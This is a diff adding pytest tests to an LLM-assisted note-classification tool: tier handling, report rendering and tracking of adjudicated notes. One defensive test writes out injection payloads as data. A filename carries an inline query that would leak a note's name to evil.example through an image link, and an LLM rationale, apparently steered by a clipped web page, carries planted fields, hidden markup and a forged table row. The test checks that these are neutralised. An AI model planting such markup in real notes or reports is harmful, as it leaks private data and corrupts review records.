@@ -691,3 +691,119 @@ def test_a_command_line_ruling_refreshes_the_whole_page(vault: Path,
     assert "[[Knowledge/A|A]]" not in page
     assert "[[Knowledge/B|B]]" in page
     assert _page_fm(vault)["pending"] == 1
+
+
+# ---------------------------------------------------------------------------
+# Accept never lowers a tier (M-DASH #248).
+# ---------------------------------------------------------------------------
+
+@pytest.mark.parametrize("current", ["restricted", "confidential"])
+def test_accept_on_a_note_already_at_or_above_its_proposal_keeps_the_tier(
+        vault: Path, current: str, capsys: pytest.CaptureFixture[str]):
+    """L0 can raise a queued note past its stale suggestion; accepting the
+    suggestion afterwards must reconcile, not write the lower tier back."""
+    p = _queued(vault, "N", current, "confidential")
+    ruled, _ = C.rule_on([p], "accept", None, dry_run=False)
+    got = fm_of(p)
+    assert ruled == 1
+    assert got["classification"] == current
+    assert got["classification_reviewed"] is True
+    assert "classification_suggested" not in got
+    assert "classification_rationale" not in got
+    assert (f"accepted, kept {current} (already at or above confidential)"
+            in capsys.readouterr().out)
+
+
+# ---------------------------------------------------------------------------
+# The run report is outside text too (M-DASH #32, #247).
+# ---------------------------------------------------------------------------
+
+def _report(vault: Path, monkeypatch: pytest.MonkeyPatch, records: list[dict]) -> str:
+    report = vault / "Templates" / "Scripts" / "last-classification-review.md"
+    report.parent.mkdir(parents=True, exist_ok=True)
+    monkeypatch.setattr(C, "REPORT_FILE", report)
+    C.write_report(records, len(records), dry_run=False)
+    return report.read_text(encoding="utf-8")
+
+
+def _rec(rel: str, rationale: str, confidence: str = "high") -> dict:
+    return {"action": "suggested", "rel": rel, "title": Path(rel).stem,
+            "from": "internal-use-only", "to": "confidential", "layer": "llm",
+            "confidence": confidence, "rationale": rationale}
+
+
+def test_report_renders_an_ordinary_row_as_before(vault: Path,
+                                                  monkeypatch: pytest.MonkeyPatch):
+    text = _report(vault, monkeypatch,
+                   [_rec("Knowledge/Plain Note.md", "budget figures")])
+    assert ("| [[Plain Note]] | internal-use-only | confidential | high "
+            "| budget figures |") in text
+
+
+def test_report_rationale_and_stem_cannot_plant_a_query_or_field(
+        vault: Path, monkeypatch: pytest.MonkeyPatch):
+    """An invitee's display name becomes a People/ filename and a clipped page
+    steers the rationale: neither may reach the report as live markup."""
+    import templater_guard
+    stem = 'Eve]] `= "![](https://evil.example/"+[[Board Prep]].file.name+")"` [['
+    rationale = ('see `INPUT[toggle:People/X.md#classification_reviewed]` and '
+                 '`= [[Some Note]].classification` %% hide\n'
+                 '| [[Forged]] | a | b | c | d |')
+    text = _report(vault, monkeypatch, [
+        _rec(f"People/{stem}.md", rationale, confidence="high` INPUT[x] |"),
+        _rec("Knowledge/Z Later.md", "ok")])
+    rows = [ln for ln in text.splitlines() if ln.startswith("|")]
+    assert len(rows) == 4              # header, separator, two records
+    assert not any("`" in row for row in rows)
+    assert "INPUT[" not in text
+    assert "[[Board Prep" not in text
+    assert "[[Some Note" not in text
+    assert "[[Forged" not in text
+    assert "%%" not in text
+    assert "[[Z Later]]" in text
+    assert templater_guard.is_neutral(text)
+
+
+# ---------------------------------------------------------------------------
+# Tracking records only notes L1 adjudicated (M-DASH #35).
+# ---------------------------------------------------------------------------
+
+def _run(vault: Path, monkeypatch: pytest.MonkeyPatch, client, *extra: str) -> dict:
+    import llm_endpoint
+    monkeypatch.setattr(C, "TRACKING_FILE", vault / ".classification_tracking.json")
+    # --vault re-points the report under Templates/Scripts; restore it after.
+    monkeypatch.setattr(C, "REPORT_FILE", C.REPORT_FILE)
+    (vault / "Templates" / "Scripts").mkdir(parents=True, exist_ok=True)
+    monkeypatch.setattr(llm_endpoint, "client", lambda: client)
+    monkeypatch.setattr(llm_endpoint, "describe", lambda: "fake")
+    monkeypatch.setattr(C.sys, "argv", ["classify_notes.py", "--vault", str(vault),
+                                        *extra])
+    assert C.main() == 0
+    return C.load_tracking()
+
+
+def test_a_detectors_only_run_leaves_notes_for_the_model(
+        vault: Path, monkeypatch: pytest.MonkeyPatch):
+    write(vault, "Knowledge/A.md", "ordinary text", classification="internal-use-only")
+    assert "Knowledge/A.md" not in _run(vault, monkeypatch, None, "--detectors-only")
+    # ...so the next scheduled run still asks the model about it.
+    client = FakeClient("confidential")
+    _run(vault, monkeypatch, client)
+    assert len(client.calls) == 1
+
+
+def test_an_unreadable_verdict_is_not_tracked(vault: Path,
+                                              monkeypatch: pytest.MonkeyPatch):
+    write(vault, "Knowledge/A.md", "ordinary text", classification="internal-use-only")
+    tracking = _run(vault, monkeypatch, FakeClient(raw="no json here"))
+    assert "Knowledge/A.md" not in tracking
+    report = (vault / "Templates" / "Scripts" / "last-classification-review.md"
+              ).read_text(encoding="utf-8")
+    assert "## Errors — 1" in report
+    assert "unparseable model response" in report
+
+
+def test_an_adjudicated_note_is_still_tracked(vault: Path,
+                                              monkeypatch: pytest.MonkeyPatch):
+    write(vault, "Knowledge/A.md", "ordinary text", classification="internal-use-only")
+    assert "Knowledge/A.md" in _run(vault, monkeypatch, FakeClient("confidential"))
